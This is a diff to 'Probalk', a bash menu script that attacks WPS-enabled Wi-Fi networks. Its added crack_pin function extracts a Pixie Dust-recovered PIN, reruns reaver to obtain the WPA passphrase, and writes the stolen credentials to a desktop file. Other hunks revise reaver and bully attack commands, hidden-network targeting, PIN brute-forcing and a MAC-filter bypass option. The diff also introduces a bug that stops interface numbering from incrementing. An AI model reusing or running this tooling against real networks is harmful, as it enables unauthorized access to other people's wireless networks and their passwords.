@@ -17,6 +17,7 @@ cp include/win36h.zip  /tmp/probalk
 cp include/airmon.sh /tmp/probalk
 chmod 7777 *
 cd /tmp/probalk
+chmod 7777 *
 handshake=no
 hiddens=no
 
@@ -300,6 +301,10 @@ fi
 
 
 }
+pausef(){
+read -p "$*"
+}
+
 
 ##################function####enable-monitor-mode
 enablemonitormode(){
@@ -324,7 +329,7 @@ if [ "$intn" -gt "0" ]; then
                         i=0
 
                         for line in "${wirelessifaces[@]}"; do
-                                i=$(($i+1))
+                                i=$(($i+0))
                                 wirelessifaces[$i]=$line
                                 echo -e " "$i") $line"
                         done
@@ -373,7 +378,8 @@ mainpage
 
 }
 selectarget(){
-echo -e "A New Window Will Apeare .When You see Your Network Tap Once CTRL+C" | sleep 1.5
+echo -e "A New Window Will Apeare .When You see Your Network Tap Once CTRL+C" && sleep 1.5
+pausef 'Are You Ready ? [Press Enter To Start Scanning  ]... ' 
 
 scanheart
 clear
@@ -429,20 +435,45 @@ read -p " Enter The Number Of Your Choise:" choiseheart
 done
 
 
+}
+crack_pin(){
+if [ "$hiddens" == "no" ] ; then
+hdn=""
+else
+hdn="-e $essid"
+fi
+pin=`cat /tmp/probalk/pixiewpsreaver.txt  | grep "WPS pin:"|cut -d : -f2`  
+pin=`echo $pin`
+if [ "$pin" != "" ] ; then
+	echo "Passwords & pin cracked by probalk" > ~/Desktop/probalk_passwords.txt
+	echo "{+}essid=$essid" >> ~/Desktop/probalk_passwords.txt
+	echo "{+}bssid=$bssid" >> ~/Desktop/probalk_passwords.txt
+	echo "{+}Pin=$pin" >> ~/Desktop/probalk_passwords.txt
+	echo -e "$Red Pin $Green Found $Cyan:$pin"
+	echo "[+] Running reaver with the current pin ..."
+	reaver -i $nameintc "$hdn" -b $bssid  -c $ch  -p $pin  2>&1 | tee /tmp/probalk/pixiewps.txt
+	cat /tmp/probalk/pixiewps.txt | grep "WPA PSK:" >> ~/Desktop/probalk_passwords.txt
+	echo -e "$BGreen"
+	pausef 'press any key to continue ....'
 
-
-
+else
+	echo "failed"
+	sleep 2
+fi
 
 
 }
 
-
-
 pixiewpsrever(){
 	trap wpsmainpage SIGINT SIGTERM SIGHUP
-		iwconfig $nameintc channel $ch
-	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Pixie Dust Attack Using Reaver"  -e "reaver -i $nameintc  -b $bssid -e $essid -c $ch -vv    -K 1 -q  -f 	 2>&1 | tee ~/Desktop/pixiewpsreaver.txt "
+if [ "$hiddens" == "no" ] ; then	
 
+		iwconfig $nameintc channel $ch
+	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Pixie Dust Attack Using Reaver"  -e "reaver -i $nameintc  -b $bssid  -c $ch     -K 1 -q -N -vvv -f  2>&1 | tee /tmp/probalk/pixiewpsreaver.txt && killall xterm "
+else
+xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Pixie Dust Attack Using Reaver"  -e "reaver -i $nameintc -b $bssid   -c $ch -e $essid    -K 1 -q -N -vvv -f  2>&1 | tee /tmp/probalk/probalk_passwords.txt "
+fi
+crack_pin
 
 }
 pixiewpsbully(){
@@ -450,9 +481,9 @@ pixiewpsbully(){
 	trap wpsmainpage SIGINT SIGTERM SIGHUP
 if [ "$hiddens" == "no" ] ; then	
 
-	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231" -ls -title "Pixie Dust Attack Using Bully"  -e "bully   -b $bssid  -c $ch -d  -F $nameintc -o ~/Desktop/bully.pin.probalk.txt "
+	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231" -ls -title "Pixie Dust Attack Using Bully"  -e "bully   -b $bssid  -c $ch $nameintc -d -v 4   2>&1 | tee ~/Desktop/probalk_pins-passwords_bully.txt"
 else
-	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231" -ls -title "Pixie Dust Attack Using Bully"  -e "bully    -e $essid -c $ch -d  -F $nameintc -o ~/Desktop/bully.pin.probalk.txt "
+	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231" -ls -title "Pixie Dust Attack Using Bully"  -e "bully  -e $essid -b $bssid  -c $ch $nameintc -d -v 4   2>&1 | tee ~/Desktop/probalk_pins-passwords_bully.txt "
 
 
 fi
@@ -469,7 +500,7 @@ defaultpinreaver(){
 brueteforcepinreaver(){
 	iwconfig $nameintc channel $ch
 	trap wpsmainpage SIGINT SIGTERM SIGHUP
-	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Brute-Force Pin Using Reaver "  -e "reaver -i  $nameintc -b $bssid -e $essid -c $ch  -q -f "
+	xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Brute-Force Pin Using Reaver "  -e "reaver -i  $nameintc -b $bssid -e $essid -c $ch   -f "
 
 
 
@@ -673,6 +704,7 @@ if [ -e "$pwdpath" ] ; then
 	echo -e " $BCyan  PASSWORD $BGreen FOUND => $Yellow "$pwdh""
 	res=1
 	sleep 9
+		pausef 'press any key to continue ....'
 fi
 done
 }
@@ -796,43 +828,16 @@ cleanup
 echo -e "$BPurple -Cleaning Up All Temporary Files Created By This Script....Hope All Processes Are Killed"
 echo -e "$BCyan -This Script Was Created By SOYALK From morocco.To Demonstrate How Can Hackers Do To Get In Your Network Hope You Enjoy It."
 echo -e "$BYelow -You can Suggest Some Features To Be Added Next Version EMAIL: likramabderrahman@gmail.com"
-echo -e "$BYelow Support Me By Donate (my old website ) :http://www.soyalk.tk/donate.html"
+echo -e "$BCyan Support US By Donate $GGreen :[+] https://www.paypal.me/Likram [+]  $BCyan Small Donate Help Us To improve Our Prpjects  "
+echo -e "$BYelow website : [*] https://www.soyalk.tk [*] "
 center3 " SEE YOU (;"
 choise "{Probalk}"
-endlogo
+
 
 
 exit $?
 }
 ####
-
-#check root permition
-#####endofsc
-endlogo(){
-
-
-
-center3 "  ██░▀██████████████▀░██ "
-center3 "  █▌▒▒░████████████░▒▒▐█ "
-center3 "  █░▒▒▒░██████████░▒▒▒░█ "
-center3 "  ▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▐ "
-center3 "  ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ "
-center3 " ███▀▀▀██▄▒▒▒▒▒▒▒▄██▀▀▀██ "
-center3 " ██░░░▐█░▀█▒▒▒▒▒█▀░█▌░░░█ "
-center3 " ▐▌░░░▐▄▌░▐▌▒▒▒▐▌░▐▄▌░░▐▌ "
-center3 "  █░░░▐█▌░░▌▒▒▒▐░░▐█▌░░█ "
-center3 "  ▒▀▄▄▄█▄▄▄▌░▄░▐▄▄▄█▄▄▀▒"
-center3 "  ░░░░░░░░░░└┴┘░░░░░░░░░"
-center3 "  ██▄▄░░░░░░░░░░░░░░▄▄██"
-center3 "  ████████▒▒▒▒▒▒████████"
-center3 "  █▀░░███▒▒░░▒░░▒▀██████"
-center3 "  █▒░███▒▒╖░░╥░░╓▒▐█████"
-center3 "  █▒░▀▀▀░░║░░║░░║░░█████"
-center3 "  ██▄▄▄▄▀▀┴┴╚╧╧╝╧╧╝┴┴███"
-center3 "  ██████████████████████"
-
-}
-
 sleep 1
 ##Start-logo
 defstartsoyalk(){
@@ -845,7 +850,7 @@ center1 "  ██║     ██║  ██║╚██████╔╝██�
 center1 "  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝" && sleep 0.1
 YEAR=`date -u +%Y`
 center2 " Script By Soyalk For Testing Networks Security.® $YEAR "
-sleep 1.5
+sleep 0.5
 }
 choises(){
 choise "{Probalk}"
@@ -907,7 +912,7 @@ wpsfunchoses(){
 choise "{Probalk}" && sleep 0.1 
 echo -e  "$BCyan 1) Pixe Dust Attack Using Reaver" && sleep 0.1
 choise "{Probalk}"
-echo -e  "$BCyan 2) Pixe Dust Attack Using Bully" && sleep 0.1
+echo -e  "$BCyan 2) Pixe Dust Attack Using Bully (recommended if you have Ralink chipset)" && sleep 0.1
 choise "{Probalk}"
 echo -e  "$BCyan 3) Default Pin With Reaver(if exist) " && sleep 0.1  
 choise "{Probalk}"
@@ -919,9 +924,9 @@ echo -e  "$BCyan 6) Custom Pin with Reaver" && sleep 0.1
 choise "{Probalk}"
 echo -e  "$BCyan 7) Custom Pin with Bully" && sleep 0.1
 choise "{Probalk}"
-echo -e  "$BCyan 8)Hidden Acces Points (Choosee It If The Targeted Network Is Hidden) " && sleep 0.1
+echo -e  "$BCyan 8)Hidden Acces Points (Choose It If The Targeted Network Is Hidden) " && sleep 0.1
 choise "{Probalk}"
-echo -e  "$BCyan 9) Bypass MAC Filter (Blacklist / whitelist)" && sleep 0.1
+echo -e  "$BCyan 9) Bypass MAC Filter (Against Blacklist / whitelist)" && sleep 0.1
 choise "{Probalk}"
 echo -e  "$BCyan 10) Back To start Menu " && sleep 0.1
 choise "{Probalk}"
@@ -1088,4 +1093,5 @@ rm -rf $filecsv 2>/dev/null
 ifinput
 }
 mainpage
-#############################
+#############################	echo "[+] Running reaver with the pin :$pin"
+
